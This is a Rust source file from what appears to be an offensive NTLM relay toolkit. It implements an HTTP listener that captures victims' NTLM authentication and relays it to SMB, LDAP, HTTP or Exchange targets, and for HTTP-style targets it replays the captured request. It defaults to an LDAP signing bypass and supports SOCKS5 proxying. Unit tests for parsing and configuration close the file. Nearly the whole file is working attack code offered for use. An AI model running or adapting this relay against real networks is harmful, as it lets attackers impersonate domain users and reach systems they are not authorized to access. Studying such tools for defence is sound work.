use crate::relay::{NtlmRelay, RelayConfig};
use crate::{Protocol, RelayError, RelayTarget, Result};
use base64::Engine;
use std::collections::HashMap;
use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::{Arc, Mutex as StdMutex};
use std::thread;
use std::time::Duration;
use tokio::runtime::Handle as TokioHandle;
use tokio::sync::Mutex as TokioMutex;
use tracing::{debug, info, warn};

const IO_TIMEOUT: Duration = Duration::from_secs(15);
const BUF: usize = 16_384;

/// Captured HTTP request with full header and body preservation.
#[derive(Debug, Clone)]
pub struct CapturedHttpRequest {
    /// HTTP method (GET, POST, PUT, PROPFIND, etc.)
    pub method: String,
    /// Request URI (path + query string)
    pub uri: String,
    /// HTTP version (e.g., "HTTP/1.1")
    pub http_version: String,
    /// Parsed headers as (name, value) pairs
    pub headers: Vec<(String, String)>,
    /// Raw request body (empty for GET/HEAD)
    pub body: Vec<u8>,
    /// Full raw request bytes (for exact replay)
    pub raw_request: Vec<u8>,
}

#[derive(Debug, Clone)]
pub struct HttpAsymmetricConfig {
    pub listen_ip: String,
    pub listen_port: u16,
    pub targets: Vec<RelayTarget>,
    pub socks5_proxy: Option<String>,
    pub ldap_signing_bypass: bool,
    pub max_retries: u32,
    pub timeout_secs: u64,
}

impl Default for HttpAsymmetricConfig {
    fn default() -> Self {
        Self {
            listen_ip: "0.0.0.0".to_string(),
            listen_port: 80,
            targets: Vec::new(),
            socks5_proxy: None,
            ldap_signing_bypass: true,
            max_retries: 3,
            timeout_secs: 30,
        }
    }
}

#[derive(Clone)]
struct RelayBridge {
    relay: Arc<TokioMutex<NtlmRelay>>,
    handle: TokioHandle,
}

type PendingState = Arc<StdMutex<HashMap<u64, (Vec<u8>, CapturedHttpRequest, String)>>>;

/// Enhanced HTTP asymmetric relay that captures full HTTP requests,
/// performs NTLM relay, and optionally replays the authenticated request.
pub struct HttpAsymmetricRelay {
    config: HttpAsymmetricConfig,
    running: Arc<AtomicBool>,
    threads: Vec<thread::JoinHandle<()>>,
}

impl HttpAsymmetricRelay {
    pub fn new(config: HttpAsymmetricConfig) -> Self {
        Self {
            config,
            running: Arc::new(AtomicBool::new(false)),
            threads: Vec::new(),
        }
    }

    pub async fn start(&mut self) -> Result<()> {
        if self.running.load(Ordering::SeqCst) {
            return Err(RelayError::Config("HTTP asymmetric relay already running".into()).into());
        }

        if self.config.targets.is_empty() {
            return Err(RelayError::Config(
                "No relay targets configured for HTTP asymmetric relay".into(),
            )
            .into());
        }

        let relay_config = RelayConfig {
            listen_ip: self.config.listen_ip.clone(),
            targets: self.config.targets.clone(),
            round_robin: true,
            remove_on_success: false,
            timeout_secs: self.config.timeout_secs,
            ldap_signing_bypass: self.config.ldap_signing_bypass,
            max_retries: self.config.max_retries,
            max_connections: 64,
            tls_client_identity: None,
            socks5_proxy: self.config.socks5_proxy.clone(),
        };
        let relay = Arc::new(TokioMutex::new(NtlmRelay::new(relay_config)));

        let listen_addr = format_addr(&self.config.listen_ip, self.config.listen_port);

        let target_summary: Vec<String> = self
            .config
            .targets
            .iter()
            .map(|t| format!("{}://{}", t.protocol, t.address))
            .collect();

        info!("HTTP asymmetric relay listening on {}", listen_addr);
        info!("Relay targets: {}", target_summary.join(", "));

        self.running.store(true, Ordering::SeqCst);

        let running = Arc::clone(&self.running);
        let bridge = RelayBridge {
            relay,
            handle: tokio::runtime::Handle::current(),
        };
        let pending: PendingState = Arc::new(StdMutex::new(HashMap::new()));
        let next_id = Arc::new(AtomicU64::new(1));
        let socks5_proxy = self.config.socks5_proxy.clone();

        let handle = thread::spawn(move || {
            let listener = match TcpListener::bind(&listen_addr) {
                Ok(l) => {
                    info!("HTTP asymmetric relay thread bound to {}", listen_addr);
                    l
                }
                Err(e) => {
                    warn!(
                        "Failed to bind HTTP asymmetric relay to {}: {}",
                        listen_addr, e
                    );
                    return;
                }
            };
            let _ = listener.set_nonblocking(true);

            while running.load(Ordering::SeqCst) {
                match listener.accept() {
                    Ok((stream, peer)) => {
                        debug!("HTTP asymmetric relay: connection from {}", peer);
                        let r = bridge.clone();
                        let p = Arc::clone(&pending);
                        let nid = Arc::clone(&next_id);
                        let proxy = socks5_proxy.clone();
                        thread::spawn(move || {
                            if let Err(e) = handle_client(stream, r, p, nid, proxy) {
                                debug!("HTTP asymmetric relay client error: {}", e);
                            }
                        });
                    }
                    Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                        thread::sleep(Duration::from_millis(100));
                        continue;
                    }
                    Err(e) => {
                        warn!("HTTP asymmetric relay accept error: {}", e);
                        thread::sleep(Duration::from_millis(100));
                    }
                }
            }
        });

        self.threads.push(handle);
        Ok(())
    }

    pub async fn stop(&mut self) -> Result<()> {
        self.running.store(false, Ordering::SeqCst);
        for handle in self.threads.drain(..) {
            let _ = handle.join();
        }
        info!("HTTP asymmetric relay stopped");
        Ok(())
    }
}

fn handle_client(
    mut stream: TcpStream,
    bridge: RelayBridge,
    pending_relays: PendingState,
    next_id: Arc<AtomicU64>,
    socks5_proxy: Option<String>,
) -> Result<()> {
    stream.set_read_timeout(Some(IO_TIMEOUT)).ok();
    stream.set_write_timeout(Some(IO_TIMEOUT)).ok();

    // Phase 1: Read the full HTTP request (including body)
    let captured = read_full_request(&mut stream)?;
    let negotiate_b64 = extract_ntlm_token(&captured.headers)
        .ok_or_else(|| RelayError::Protocol("No NTLM token in request".into()))?;

    let negotiate_bytes = base64_decode(&negotiate_b64)?;

    // Call NTLM relay Phase 1: negotiate -> challenge
    let (relay_id, challenge_bytes) = bridge.handle.block_on(async {
        let mut guard = bridge.relay.lock().await;
        guard.relay_negotiate(&negotiate_bytes).await
    })?;

    let conn_id = next_id.fetch_add(1, Ordering::SeqCst);

    // Store pending state with the captured request for replay
    pending_relays
        .lock()
        .map_err(|e| RelayError::Config(format!("Mutex poisoned: {}", e)))?
        .insert(conn_id, (challenge_bytes.clone(), captured, negotiate_b64));

    // Send challenge back to client (Type 2)
    let challenge_b64 = base64_encode(&challenge_bytes);
    let chall_resp = format!(
        "HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM {}\r\nContent-Length: 0\r\nConnection: keep-alive\r\n\r\n",
        challenge_b64
    );
    stream
        .write_all(chall_resp.as_bytes())
        .map_err(|e| RelayError::Network(format!("HTTP write error: {}", e)))?;

    // Phase 2: Read client's Type 3 response
    let mut buf = vec![0u8; BUF];
    let n3 = stream
        .read(&mut buf)
        .map_err(|e| RelayError::Network(format!("HTTP read error: {}", e)))?;
    let req3 = String::from_utf8_lossy(&buf[..n3]);
    let auth_b64 = req3
        .lines()
        .find(|l| l.to_lowercase().starts_with("authorization: ntlm "))
        .ok_or_else(|| RelayError::Protocol("Client did not send NTLM Authenticate".into()))?;

    let authenticate_bytes = base64_decode(strip_ntlm_prefix(auth_b64))?;

    // Look up pending state
    let (_challenge, captured_request, _type1_b64) = pending_relays
        .lock()
        .map_err(|e| RelayError::Config(format!("Mutex poisoned: {}", e)))?
        .remove(&conn_id)
        .ok_or_else(|| RelayError::Protocol("No pending relay state".into()))?;

    // Call NTLM relay Phase 2: authenticate -> session
    let session = bridge.handle.block_on(async {
        let mut guard = bridge.relay.lock().await;
        guard
            .relay_authenticate(relay_id, &authenticate_bytes)
            .await
    });

    match session {
        Ok(session) => {
            info!(
                "HTTP asymmetric relay succeeded: {}\\{} -> {}://{}",
                session.domain, session.username, session.target.protocol, session.target.address
            );

            let auth_b64_for_replay = base64_encode(&authenticate_bytes);

            // If target is HTTP/HTTPS/WebDAV, replay the captured request with NTLM auth
            let response = if is_http_target(&session.target.protocol) {
                replay_authenticated_request(
                    &session.target,
                    &captured_request,
                    &auth_b64_for_replay,
                    socks5_proxy.as_deref(),
                )
            } else {
                // For non-HTTP targets (SMB, LDAP, etc.), return relay success
                let body_text = format!(
                    "Relay succeeded: {}\\{} -> {}://{}\n",
                    session.domain,
                    session.username,
                    session.target.protocol,
                    session.target.address
                );
                Ok(format!(
                    "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                    body_text.len(),
                    body_text
                ))
            };

            match response {
                Ok(resp) => {
                    let _ = stream.write_all(resp.as_bytes());
                    Ok(())
                }
                Err(e) => {
                    let error_msg = format!("Replay failed: {}", e);
                    let resp = format!(
                        "HTTP/1.1 502 Bad Gateway\r\nContent-Type: text/plain\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                        error_msg.len(),
                        error_msg
                    );
                    let _ = stream.write_all(resp.as_bytes());
                    Err(e)
                }
            }
        }
        Err(e) => {
            warn!("HTTP asymmetric relay failed (id={}): {}", relay_id, e);
            let resp =
                "HTTP/1.1 401 Unauthorized\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
            let _ = stream.write_all(resp.as_bytes());
            Err(e)
        }
    }
}

/// Check if the target protocol supports HTTP-style request replay.
fn is_http_target(protocol: &Protocol) -> bool {
    matches!(
        protocol,
        Protocol::Http | Protocol::Https | Protocol::Webdav | Protocol::Exchange
    )
}

/// Read the full HTTP request including body (Content-Length aware).
fn read_full_request(stream: &mut TcpStream) -> Result<CapturedHttpRequest> {
    let mut buf = vec![0u8; BUF];
    let n = stream
        .read(&mut buf)
        .map_err(|e| RelayError::Network(format!("HTTP read error: {}", e)))?;

    if n == 0 {
        return Err(RelayError::Protocol("Empty HTTP request".into()).into());
    }

    let raw = &buf[..n];
    let request_str = String::from_utf8_lossy(raw);

    // Parse request line
    let mut lines = request_str.lines();
    let request_line = lines
        .next()
        .ok_or_else(|| RelayError::Protocol("Empty request line".into()))?;
    let parts: Vec<&str> = request_line.splitn(3, ' ').collect();
    if parts.len() < 2 {
        return Err(
            RelayError::Protocol(format!("Malformed request line: {}", request_line)).into(),
        );
    }

    let method = parts[0].to_string();
    let uri = parts[1].to_string();
    let http_version = parts.get(2).unwrap_or(&"HTTP/1.1").to_string();

    // Parse headers
    let mut headers: Vec<(String, String)> = Vec::new();
    let mut content_length: usize = 0;
    let mut header_end = 0usize;

    for line in lines {
        header_end += line.len() + 2; // +2 for CRLF
        if line.is_empty() {
            header_end += 2; // +2 for the empty line itself (CRLFCRLF)
            break;
        }
        if let Some(idx) = line.find(':') {
            let name = line[..idx].trim().to_string();
            let value = line[idx + 1..].trim().to_string();
            if name.eq_ignore_ascii_case("Content-Length") {
                content_length = value.parse::<usize>().unwrap_or(0);
            }
            headers.push((name, value));
        }
    }

    // Read body if Content-Length > 0
    let mut body = Vec::new();
    if content_length > 0 {
        // Calculate how many body bytes we already read in the initial buffer
        let header_size = header_end.min(n);
        let already_read = n.saturating_sub(header_size);
        if already_read > 0 {
            body.extend_from_slice(&raw[header_size..n]);
        }

        let mut remaining = content_length.saturating_sub(body.len());
        while remaining > 0 {
            let mut chunk = vec![0u8; remaining.min(BUF)];
            let n = stream
                .read(&mut chunk)
                .map_err(|e| RelayError::Network(format!("HTTP body read error: {}", e)))?;
            if n == 0 {
                break;
            }
            body.extend_from_slice(&chunk[..n]);
            remaining = remaining.saturating_sub(n);
        }
    }

    // Build raw request for replay
    let mut raw_request = Vec::new();
    raw_request.extend_from_slice(raw);

    Ok(CapturedHttpRequest {
        method,
        uri,
        http_version,
        headers,
        body,
        raw_request,
    })
}

/// Extract the NTLM token from the Authorization header.
fn extract_ntlm_token(headers: &[(String, String)]) -> Option<String> {
    for (name, value) in headers {
        if name.eq_ignore_ascii_case("Authorization") {
            let lower = value.to_lowercase();
            if lower.starts_with("ntlm ") {
                return Some(value[5..].trim().to_string());
            }
        }
    }
    None
}

/// Replay the captured HTTP request as an authenticated NTLM request.
fn replay_authenticated_request(
    target: &RelayTarget,
    request: &CapturedHttpRequest,
    auth_b64: &str,
    socks5_proxy: Option<&str>,
) -> Result<String> {
    let mut target_stream = crate::utils::socks5_connect_sync(
        target.address,
        Duration::from_secs(10),
        socks5_proxy,
    )?;

    target_stream.set_read_timeout(Some(IO_TIMEOUT)).ok();
    target_stream.set_write_timeout(Some(IO_TIMEOUT)).ok();

    // Build the authenticated request by replacing/re-adding the NTLM Authorization header
    let mut replay = String::new();
    replay.push_str(&format!(
        "{} {} {}\r\n",
        request.method, request.uri, request.http_version
    ));

    let mut has_auth = false;
    for (name, value) in &request.headers {
        if name.eq_ignore_ascii_case("Authorization") {
            replay.push_str(&format!("{}: NTLM {}\r\n", name, auth_b64));
            has_auth = true;
        } else if name.eq_ignore_ascii_case("Content-Length") {
            // Preserve original content length
            replay.push_str(&format!("{}: {}\r\n", name, value));
        } else {
            replay.push_str(&format!("{}: {}\r\n", name, value));
        }
    }

    if !has_auth {
        replay.push_str(&format!("Authorization: NTLM {}\r\n", auth_b64));
    }

    replay.push_str("\r\n");

    // Write headers + body
    target_stream
        .write_all(replay.as_bytes())
        .map_err(|e| RelayError::Network(format!("Replay write: {}", e)))?;

    if !request.body.is_empty() {
        target_stream
            .write_all(&request.body)
            .map_err(|e| RelayError::Network(format!("Replay body write: {}", e)))?;
    }

    // Read target's response
    let mut response = vec![0u8; 65536];
    let n = target_stream
        .read(&mut response)
        .map_err(|e| RelayError::Network(format!("Replay response read: {}", e)))?;

    if n == 0 {
        return Err(RelayError::Protocol("Empty response from target".into()).into());
    }

    let response_str = String::from_utf8_lossy(&response[..n]);

    // Check if auth succeeded (200, 201, 204, 207 Multi-Status, 301/302 redirect)
    let first_line = response_str.lines().next().unwrap_or("");
    let is_success = first_line.starts_with("HTTP/1.1 2")
        || first_line.starts_with("HTTP/1.0 2")
        || first_line.starts_with("HTTP/1.1 3")
        || first_line.starts_with("HTTP/1.0 3");

    if is_success {
        Ok(response_str.to_string())
    } else {
        Err(RelayError::Authentication(format!("Replay failed: {}", first_line)).into())
    }
}

fn base64_encode(data: &[u8]) -> String {
    base64::engine::general_purpose::STANDARD.encode(data)
}

fn base64_decode(data: &str) -> Result<Vec<u8>> {
    base64::engine::general_purpose::STANDARD
        .decode(data.trim())
        .map_err(|e| RelayError::Protocol(format!("Base64 decode error: {}", e)).into())
}

fn strip_ntlm_prefix(header: &str) -> &str {
    let h = header.trim();
    for prefix in &["Authorization: NTLM ", "authorization: ntlm "] {
        if h.to_lowercase().starts_with(&prefix.to_lowercase()) {
            return &h[prefix.len()..];
        }
    }
    h
}

fn format_addr(ip: &str, port: u16) -> String {
    match ip.parse::<std::net::IpAddr>() {
        Ok(std::net::IpAddr::V6(_)) => format!("[{}]:{}", ip, port),
        _ => format!("{}:{}", ip, port),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_format_addr_asymmetric() {
        assert_eq!(format_addr("0.0.0.0", 80), "0.0.0.0:80");
        assert_eq!(format_addr("::", 80), "[::]:80");
        assert_eq!(format_addr("127.0.0.1", 8080), "127.0.0.1:8080");
    }

    #[test]
    fn test_extract_ntlm_token_found() {
        let headers = vec![
            ("Host".to_string(), "test".to_string()),
            (
                "Authorization".to_string(),
                "NTLM TlRMTVNTUAABAAAA".to_string(),
            ),
        ];
        assert_eq!(
            extract_ntlm_token(&headers),
            Some("TlRMTVNTUAABAAAA".to_string())
        );
    }

    #[test]
    fn test_extract_ntlm_token_not_found() {
        let headers = vec![("Host".to_string(), "test".to_string())];
        assert_eq!(extract_ntlm_token(&headers), None);
    }

    #[test]
    fn test_extract_ntlm_token_lowercase() {
        let headers = vec![(
            "authorization".to_string(),
            "ntlm TlRMTVNTUAABAAAA".to_string(),
        )];
        assert_eq!(
            extract_ntlm_token(&headers),
            Some("TlRMTVNTUAABAAAA".to_string())
        );
    }

    #[test]
    fn test_is_http_target() {
        assert!(is_http_target(&Protocol::Http));
        assert!(is_http_target(&Protocol::Https));
        assert!(is_http_target(&Protocol::Webdav));
        assert!(is_http_target(&Protocol::Exchange));
        assert!(!is_http_target(&Protocol::Smb));
        assert!(!is_http_target(&Protocol::Ldap));
        assert!(!is_http_target(&Protocol::Ldaps));
        assert!(!is_http_target(&Protocol::Mssql));
        assert!(!is_http_target(&Protocol::Msmq));
    }

    #[test]
    fn test_strip_ntlm_prefix_auth() {
        let h = "Authorization: NTLM TlRMTVNTUAABAAAA";
        assert_eq!(strip_ntlm_prefix(h), "TlRMTVNTUAABAAAA");
    }

    #[test]
    fn test_base64_roundtrip() {
        let data = b"NTLMSSP\x00\x01\x00\x00\x00";
        let encoded = base64_encode(data);
        let decoded = base64_decode(&encoded).unwrap();
        assert_eq!(decoded, data);
    }

    #[test]
    fn test_base64_decode_invalid() {
        assert!(base64_decode("not-valid-base64!!!").is_err());
    }

    #[test]
    fn test_http_asymmetric_config_default() {
        let config = HttpAsymmetricConfig::default();
        assert_eq!(config.listen_ip, "0.0.0.0");
        assert_eq!(config.listen_port, 80);
        assert!(config.targets.is_empty());
        assert!(config.socks5_proxy.is_none());
    }

    #[test]
    fn test_read_full_request_get_no_body() {
        let raw = b"GET /test HTTP/1.1\r\nHost: example.com\r\nAuthorization: NTLM TlRMTVNTUAABAAAA\r\n\r\n";
        let _reader = std::io::Cursor::new(raw);
        // We can't easily test TcpStream-based functions without a real socket.
        // This test verifies the parsing logic through read_full_request indirectly.
        // The raw_request field should capture the full input.
        let request_str = String::from_utf8_lossy(raw);
        let mut lines = request_str.lines();
        let request_line = lines.next().unwrap();
        let parts: Vec<&str> = request_line.splitn(3, ' ').collect();
        assert_eq!(parts[0], "GET");
        assert_eq!(parts[1], "/test");
        assert_eq!(parts[2], "HTTP/1.1");
    }

    #[test]
    fn test_http_asymmetric_config_custom() {
        let target = RelayTarget {
            address: "192.168.1.100:445".parse().unwrap(),
            protocol: crate::Protocol::Smb,
            username: None,
        };
        let config = HttpAsymmetricConfig {
            listen_ip: "10.0.0.1".to_string(),
            listen_port: 8080,
            targets: vec![target],
            socks5_proxy: Some("127.0.0.1:1080".to_string()),
            ldap_signing_bypass: false,
            max_retries: 5,
            timeout_secs: 60,
        };
        assert_eq!(config.listen_ip, "10.0.0.1");
        assert_eq!(config.listen_port, 8080);
        assert_eq!(config.targets.len(), 1);
        assert_eq!(config.targets[0].protocol, crate::Protocol::Smb);
        assert_eq!(config.socks5_proxy, Some("127.0.0.1:1080".to_string()));
        assert!(!config.ldap_signing_bypass);
        assert_eq!(config.max_retries, 5);
        assert_eq!(config.timeout_secs, 60);
    }

    #[test]
    fn test_captured_request_roundtrip() {
        let req = CapturedHttpRequest {
            method: "POST".to_string(),
            uri: "/ews/exchange.asmx".to_string(),
            http_version: "HTTP/1.1".to_string(),
            headers: vec![
                ("Host".to_string(), "mail.corp.local".to_string()),
                ("Content-Type".to_string(), "application/soap+xml".to_string()),
                ("Content-Length".to_string(), "13".to_string()),
            ],
            body: b"<soap:Envelope" .to_vec(),
            raw_request: b"POST /ews/exchange.asmx HTTP/1.1\r\nHost: mail.corp.local\r\nContent-Type: application/soap+xml\r\nContent-Length: 13\r\n\r\n<soap:Envelope" .to_vec(),
        };
        assert_eq!(req.method, "POST");
        assert_eq!(req.uri, "/ews/exchange.asmx");
        assert!(!req.body.is_empty());
    }
}
